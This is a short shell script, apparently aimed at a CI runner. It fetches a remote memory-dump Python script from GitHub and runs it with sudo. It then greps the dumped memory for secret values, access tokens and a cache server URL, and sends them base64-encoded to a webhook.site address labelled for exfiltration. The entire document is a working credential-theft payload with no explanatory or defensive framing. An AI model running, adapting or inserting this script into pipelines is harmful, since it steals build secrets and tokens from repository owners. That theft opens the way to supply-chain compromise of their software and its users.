YOUR_EXFIL="https://webhook.site/70e7937a-e041-4002-9ba8-35d54bbf3c57"

if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0`
  # Exfil to Burp
  curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
else
  exit 0
fi

BLOB=`curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u`
curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/token > /dev/null
